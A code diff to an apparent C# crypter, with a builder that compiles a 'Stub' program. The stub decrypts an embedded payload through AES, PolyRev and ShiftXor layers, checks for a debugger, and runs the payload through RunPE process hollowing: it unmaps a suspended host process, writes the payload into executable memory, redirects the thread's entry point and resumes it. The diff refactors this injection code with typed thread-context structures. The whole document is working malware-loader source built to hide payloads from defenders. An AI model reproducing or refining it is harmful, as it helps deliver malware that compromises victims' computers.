@@ -99,23 +99,36 @@ using System.Threading;
 
 class Stub
 {
+    #region WinAPI
     [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
     static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
-
-    #region RunPE
-    [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
-    [StructLayout(LayoutKind.Sequential, Pack = 1)]
-    private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
-    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT_X86 lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT_X64 lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT_X86 lpContext);
+    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64SetThreadContext(IntPtr hThread, ref CONTEXT_X64 lpContext);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);
     [DllImport(""ntdll.dll"", SetLastError = true)] private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
+
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct FLOATING_SAVE_AREA { public uint ControlWord, StatusWord, TagWord, ErrorOffset, ErrorSelector, DataOffset, DataSelector; [MarshalAs(UnmanagedType.ByValArray, SizeConst=80)] public byte[] RegisterArea; public uint Cr0NpxState; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT_X86 { public uint ContextFlags, Dr0, Dr1, Dr2, Dr3, Dr6, Dr7; public FLOATING_SAVE_AREA FloatSave; public uint SegGs, SegFs, SegEs, SegDs, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs; [MarshalAs(UnmanagedType.ByValArray, SizeConst=512)] public byte[] ExtendedRegisters; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct M128A { public ulong High; public long Low; }
+
+    [StructLayout(LayoutKind.Sequential, Pack=16)]
+    public struct CONTEXT_X64 { public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home; public uint ContextFlags, MxCsr; public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; public uint EFlags; public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7, Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)] public M128A[] Header; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public M128A[] Legacy; public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7, Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)] public byte[] VectorControl; public ulong DebugControl, LastBranchToRip, LastBranchFromRip, LastExceptionToRip, LastExceptionFromRip; }
+
     #endregion
 
     #region Decryption
@@ -171,26 +184,25 @@ class Stub
         try
         {
             if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, [INHERIT_HANDLES], 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception(""CreateProcess failed"");
-            int e_lfanew = BitConverter.ToInt32(payload, 60);
-            int fileHeader = e_lfanew + 4;
-            int opHeader = fileHeader + 20;
-            short magic = BitConverter.ToInt16(payload, opHeader);
-            long imageBase;
-            IntPtr context;
 
-            if (magic == 0x10b) { context = Marshal.AllocHGlobal(716); Marshal.WriteInt64(context, 0, 0x10002); if (IntPtr.Size == 4) GetThreadContext(pi.hThread, context); else Wow64GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt32(payload, opHeader + 28); }
-            else if (magic == 0x20b) { context = Marshal.AllocHGlobal(1232); Marshal.WriteInt64(context, 0, 0x100002); GetThreadContext(pi.hThread, context); imageBase = BitConverter.ToInt64(payload, opHeader + 24); }
-            else throw new Exception(""Invalid magic value"");
+            int e_lfanew = BitConverter.ToInt32(payload, 60);
+            int opHeader = e_lfanew + 24;
+            bool is32Bit = BitConverter.ToInt16(payload, opHeader) == 0x10b;
+
+            long imageBase = is32Bit ? BitConverter.ToInt32(payload, opHeader + 28) : BitConverter.ToInt64(payload, opHeader + 24);
+            uint entryPointRVA = BitConverter.ToUInt32(payload, opHeader + 40);
 
             NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
             uint sizeOfImage = BitConverter.ToUInt32(payload, opHeader + 56);
             IntPtr newImageBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
             if (newImageBase == IntPtr.Zero) throw new Exception(""VirtualAllocEx failed"");
-            int bytesWritten = 0;
-            WriteProcessMemory(pi.hProcess, newImageBase, payload, (int)BitConverter.ToUInt32(payload, opHeader + 60), ref bytesWritten);
 
-            short numberOfSections = BitConverter.ToInt16(payload, fileHeader + 2);
-            int sectionHeaderOffset = opHeader + BitConverter.ToInt16(payload, fileHeader + 16);
+            int bytesWritten = 0;
+            uint sizeOfHeaders = BitConverter.ToUInt32(payload, opHeader + 60);
+            WriteProcessMemory(pi.hProcess, newImageBase, payload, (int)sizeOfHeaders, ref bytesWritten);
+
+            short numberOfSections = BitConverter.ToInt16(payload, e_lfanew + 6);
+            int sectionHeaderOffset = opHeader + BitConverter.ToInt16(payload, e_lfanew + 20);
 
             for (int i = 0; i < numberOfSections; i++) {
                 int currentSectionOffset = sectionHeaderOffset + (i * 40);
@@ -202,9 +214,23 @@ class Stub
                 }
             }
 
-            if (magic == 0x10b) { long eax = Marshal.ReadInt64(context, 44); WriteProcessMemory(pi.hProcess, (IntPtr)(eax + 8), BitConverter.GetBytes(newImageBase.ToInt64()), 4, ref bytesWritten); Marshal.WriteInt64(context, 32, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); if (IntPtr.Size == 4) SetThreadContext(pi.hThread, context); else Wow64SetThreadContext(pi.hThread, context); }
-            else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, context); }
-            Marshal.FreeHGlobal(context);
+            if (is32Bit)
+            {
+                CONTEXT_X86 context = new CONTEXT_X86();
+                context.ContextFlags = 0x10001; // CONTEXT_CONTROL
+                GetThreadContext(pi.hThread, ref context);
+                context.Eip = (uint)(newImageBase.ToInt64() + entryPointRVA);
+                SetThreadContext(pi.hThread, ref context);
+            }
+            else
+            {
+                CONTEXT_X64 context = new CONTEXT_X64();
+                context.ContextFlags = 0x100001; // CONTEXT_CONTROL
+                Wow64GetThreadContext(pi.hThread, ref context);
+                context.Rip = (ulong)(newImageBase.ToInt64() + entryPointRVA);
+                Wow64SetThreadContext(pi.hThread, ref context);
+            }
+
             ResumeThread(pi.hThread);
         } catch (Exception ex) {
             #if DEBUG
@@ -235,20 +261,10 @@ class Stub
 
         #if DEBUG
         Console.WriteLine(""[STUB] Payload loaded. Size: "" + payload.Length);
-        Console.WriteLine(""[STUB] Decrypting Layer 3 (ShiftXor)..."");
         #endif
         payload = ShiftXorDecrypt(payload, ""[KEY3]"", [SHIFT_KEY]);
-
-        #if DEBUG
-        Console.WriteLine(""[STUB] Decrypting Layer 2 (PolyRev)..."");
-        #endif
         payload = PolyRevDecrypt(payload, ""[KEY2]"");
-
-        #if DEBUG
-        Console.WriteLine(""[STUB] Decrypting Layer 1 (AES)..."");
-        #endif
         payload = AESDecrypt(payload, ""[KEY1]"");
-
         #if DEBUG
         Console.WriteLine(""[STUB] Decryption complete. Final size: "" + payload.Length);
         #endif
@@ -341,7 +357,7 @@ class Stub
             {
                 GenerateExecutable = true,
                 OutputAssembly = outputPath,
-                CompilerOptions = "/target:" + compilerTarget + " /platform:anycpu",
+                CompilerOptions = "/target:" + compilerTarget + " /platform:anycpu /unsafe",
                 EmbeddedResources = { resourceFileName }
             };
             parameters.ReferencedAssemblies.Add("System.dll");
